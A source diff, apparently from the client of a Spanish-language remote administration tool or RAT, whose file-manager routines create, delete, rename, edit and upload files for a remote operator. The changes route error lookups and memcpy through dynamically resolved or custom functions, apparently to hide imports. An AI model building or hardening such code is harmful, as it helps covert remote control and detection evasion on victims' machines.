@@ -196,7 +196,11 @@ void CrearFolder(c_char* cPath) {
 		return;
 	}
 	if (!cCliente->mod_dynamic->KERNEL32_FM.pCreateDirectoryA(static_cast<LPCSTR>(cPath), nullptr)) {
-		cCliente->m_RemoteLog("[X] CreateDirectoryA error: " + std::to_string(GetLastError()));
+		DWORD err = 0;
+		if (cCliente->mod_dynamic->KERNEL32.pGetLastError) {
+			err = cCliente->mod_dynamic->KERNEL32.pGetLastError();
+		}
+		cCliente->m_RemoteLog("[X] CreateDirectoryA error: " + std::to_string(err));
 	}
 }
 
@@ -214,7 +218,11 @@ void CrearArchivo(c_char* cPath) {
 		cCliente->mod_dynamic->KERNEL32_FM.pCloseHandle(hNewFile);
 		hNewFile = nullptr;
 	} else {
-		cCliente->m_RemoteLog("[X] CreateFileA error: " + std::to_string(GetLastError()));
+		DWORD err = 0;
+		if (cCliente->mod_dynamic->KERNEL32.pGetLastError) {
+			err = cCliente->mod_dynamic->KERNEL32.pGetLastError();
+		}
+		cCliente->m_RemoteLog("[X] CreateFileA error: " + std::to_string(err));
 	}
 }
 
@@ -225,7 +233,11 @@ void BorrarArchivo(c_char* cPath) {
 		return;
 	}
 	if (!cCliente->mod_dynamic->KERNEL32_FM.pDeleteFileA(static_cast<LPCSTR>(cPath))) {
-		cCliente->m_RemoteLog("[X] DeleteFile error: " + std::to_string(GetLastError()));
+		DWORD err = 0;
+		if (cCliente->mod_dynamic->KERNEL32.pGetLastError) {
+			err = cCliente->mod_dynamic->KERNEL32.pGetLastError();
+		}
+		cCliente->m_RemoteLog("[X] DeleteFile error: " + std::to_string(err));
 	}
 }
 
@@ -239,7 +251,11 @@ void RenombrarArchivo(c_char* cPath, c_char* cNuevoNombre) {
 		error();
 		__DBG_("Error renombrando archivo");
 		__DBG_(std::string(cPath) + "|" + std::string(cNuevoNombre));
-		cCliente->m_RemoteLog("[X] MoveFile error: " + std::to_string(GetLastError()));
+		DWORD err = 0;
+		if (cCliente->mod_dynamic->KERNEL32.pGetLastError) {
+			err = cCliente->mod_dynamic->KERNEL32.pGetLastError();
+		}
+		cCliente->m_RemoteLog("[X] MoveFile error: " + std::to_string(err));
 	}
 }
 
@@ -250,7 +266,11 @@ void BorrarFolder(c_char* cPath) {
 		return;
 	}
 	if (!cCliente->mod_dynamic->KERNEL32_FM.pRemoveDirectoryA(static_cast<LPCSTR>(cPath))) {
-		cCliente->m_RemoteLog("[X] RemoveDirectoryA error: " + std::to_string(GetLastError()));
+		DWORD err = 0;
+		if (cCliente->mod_dynamic->KERNEL32.pGetLastError) {
+			err = cCliente->mod_dynamic->KERNEL32.pGetLastError();
+		}
+		cCliente->m_RemoteLog("[X] RemoveDirectoryA error: " + std::to_string(err));
 	}
 }
 
@@ -260,7 +280,11 @@ void EditarArchivo_Guardar(const std::string strPath, c_char* cBuffer, std::stre
 	std::ofstream localFile(strPath, std::ios::binary);
 	if (!localFile.is_open()) {
 		__DBG_("No se pudo abrir el archivo " + strPath);
-		cCliente->m_RemoteLog("[REMOTE-EDIT] No se pudo abrir el archivo: " + std::to_string(GetLastError()));
+		DWORD err = 0;
+		if (cCliente->mod_dynamic->KERNEL32.pGetLastError) {
+			err = cCliente->mod_dynamic->KERNEL32.pGetLastError();
+		}
+		cCliente->m_RemoteLog("[REMOTE-EDIT] No se pudo abrir el archivo: " + std::to_string(err));
 		return;
 	}
 
@@ -281,7 +305,11 @@ void EnviarArchivo(const std::string& cPath, const std::string& cID, bool isEdit
 	std::ifstream localFile(cPath, std::ios::binary);
 	if (!localFile.is_open()) {
 		__DBG_("No se pudo abrir el archivo " + cPath);
-		cCliente->m_RemoteLog("[SUBIDA] No se pudo abrir el archivo: " + cPath + " >>> " + std::to_string(GetLastError()));
+		DWORD err = 0;
+		if (cCliente->mod_dynamic->KERNEL32.pGetLastError) {
+			err = cCliente->mod_dynamic->KERNEL32.pGetLastError();
+		}
+		cCliente->m_RemoteLog("[SUBIDA] No se pudo abrir el archivo: " + cPath + " >>> " + std::to_string(err));
 		return;
 	}
 
@@ -311,7 +339,7 @@ void EnviarArchivo(const std::string& cPath, const std::string& cID, bool isEdit
 		return;
 	}
 
-	memcpy(nSendBuffer.data(), strHeader.c_str(), iHeaderSize);
+	m_memcpy(nSendBuffer.data(), strHeader.c_str(), iHeaderSize);
 
 	while (1) {
 		if (cCliente->isKillSwitch()) {
